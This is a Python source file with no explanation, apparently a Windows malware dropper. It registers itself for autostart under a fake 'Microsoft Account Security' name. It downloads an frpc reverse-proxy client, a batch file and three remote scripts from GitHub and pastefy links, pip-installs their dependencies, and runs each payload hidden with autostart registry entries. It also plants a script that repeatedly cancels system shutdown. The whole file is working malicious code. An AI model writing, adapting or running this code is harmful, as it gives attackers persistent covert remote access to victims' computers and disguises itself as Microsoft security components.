import os
import sys
import uuid
import ast
import subprocess
import urllib.request
import winreg
import importlib.util
import pkgutil
import importlib.metadata

FILE_URLS = [
    "https://github.com/xiaobai1023/remote/raw/refs/heads/main/frpc.exe",
    "https://github.com/xiaobai1023/remote/raw/refs/heads/main/ll.bat",
    "https://github.com/xiaobai1023/remote/raw/refs/heads/main/frpc.ini",
    "https://pastefy.app/52j3BS20/raw",
    "https://pastefy.app/8c9ldanN/raw",
    "https://pastefy.app/m2ExEKWl/raw",
]

EXECUTABLE_EXTS = {'.exe', '.bat', '.cmd', '.ps1', '.vbs', '.py'}


def register_self_autostart():
    try:
        if getattr(sys, "frozen", False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
            winreg.SetValueEx(reg_key, "Microsoft Account Security", 0, winreg.REG_SZ, f'"{exe_path}"')
    except Exception:
        pass


def download_file(url, save_path):
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=30) as resp:
            with open(save_path, 'wb') as f:
                f.write(resp.read())
        return True
    except Exception:
        return False


def get_imports_from_script(script_path):
    try:
        with open(script_path, 'r', encoding='utf-8') as f:
            tree = ast.parse(f.read())
        imports = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    pkg = alias.name.split('.')[0]
                    imports.add(pkg)
            elif isinstance(node, ast.ImportFrom):
                if node.module is not None:
                    pkg = node.module.split('.')[0]
                    imports.add(pkg)
        return imports
    except Exception:
        return set()


def is_standard_lib(pkg_name):
    try:
        spec = importlib.util.find_spec(pkg_name)
        if spec is None:
            return False
        std_libs = set(sys.builtin_module_names) | set(
            [name for _, name, _ in pkgutil.iter_modules()])
        return pkg_name in std_libs
    except Exception:
        return False


def install_packages(packages):
    installed = set()
    try:
        for dist in importlib.metadata.distributions():
            installed.add(dist.metadata['Name'].lower())
    except Exception:
        pass
    for pkg in packages:
        if pkg.lower() in installed:
            continue
        try:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", pkg],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=False
            )
        except Exception:
            pass


def run_hidden(executable_path, args=None, cwd=None):
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        cmd = [executable_path] if args is None else [executable_path] + args
        subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            cwd=cwd,
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return True
    except Exception:
        return False


def set_autostart(executable_path, entry_name, args=None):
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.HKEY_CURRENT_USER
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
            if args:
                cmd = f'"{executable_path}" ' + ' '.join(args)
            else:
                cmd = f'"{executable_path}"'
            winreg.SetValueEx(reg_key, entry_name, 0, winreg.REG_SZ, cmd)
        return True
    except Exception:
        return False


def clear_autostart_entries(prefix):
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.HKEY_CURRENT_USER
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
            i = 0
            values = []
            while True:
                try:
                    name, _, _ = winreg.EnumValue(reg_key, i)
                    values.append(name)
                    i += 1
                except OSError:
                    break
            for name in values:
                if name.startswith(prefix):
                    try:
                        winreg.DeleteValue(reg_key, name)
                    except Exception:
                        pass
    except Exception:
        pass


def create_block_shutdown_script(work_dir):
    content = '''import ctypes
import time
import subprocess
import threading

def handler(ctrl_type):
    if ctrl_type in (0, 1, 2, 5, 6):
        return True
    return False

def shutdown_cancel_loop():
    while True:
        try:
            subprocess.run(["shutdown", "/a"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
        except:
            pass
        time.sleep(2)

ctypes.windll.kernel32.SetConsoleCtrlHandler(handler, True)
threading.Thread(target=shutdown_cancel_loop, daemon=True).start()
while True:
    time.sleep(3600)
'''
    block_path = os.path.join(work_dir, "Microsoft Account Defender.py")
    with open(block_path, 'w', encoding='utf-8') as f:
        f.write(content)
    return block_path


def main():
    if sys.platform != "win32":
        return

    register_self_autostart()

    rand_suffix = uuid.uuid4().hex[:8]
    work_dir = os.path.join(os.path.expanduser(
        "~"), f"autoscript_{rand_suffix}")
    os.makedirs(work_dir, exist_ok=True)

    downloaded = []
    for url in FILE_URLS:
        fname = os.path.basename(url)
        if not fname:
            fname = f"file_{uuid.uuid4().hex[:6]}"
        local_path = os.path.join(work_dir, fname)
        if download_file(url, local_path):
            downloaded.append(local_path)

    if not downloaded:
        return

    py_files = [p for p in downloaded if p.lower().endswith('.py')]
    all_imports = set()
    for py in py_files:
        all_imports.update(get_imports_from_script(py))
    third_party = [pkg for pkg in all_imports if not is_standard_lib(pkg)]
    if third_party:
        install_packages(third_party)

    clear_autostart_entries("MyAuto_")

    for path in downloaded:
        ext = os.path.splitext(path)[1].lower()
        if ext in EXECUTABLE_EXTS:
            if ext == '.py':
                cmd_args = [path]
                entry_name = f"Microsoft Account Security_{uuid.uuid4().hex[:6]}"
                try:
                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    key = winreg.HKEY_CURRENT_USER
                    with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
                        cmd = f'"{sys.executable}" "{path}"'
                        winreg.SetValueEx(
                            reg_key, entry_name, 0, winreg.REG_SZ, cmd)
                except Exception:
                    pass
                run_hidden(sys.executable, [path], cwd=work_dir)
            else:
                entry_name = f"Microsoft Account Security_{uuid.uuid4().hex[:6]}"
                set_autostart(path, entry_name)
                run_hidden(path, cwd=work_dir)

    block_script = create_block_shutdown_script(work_dir)
    entry_name = "Microsoft System Defender"
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.HKEY_CURRENT_USER
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
            cmd = f'"{sys.executable}" "{block_script}"'
            winreg.SetValueEx(reg_key, entry_name, 0, winreg.REG_SZ, cmd)
    except Exception:
        pass
    run_hidden(sys.executable, [block_script], cwd=work_dir)


if __name__ == "__main__":
    main()
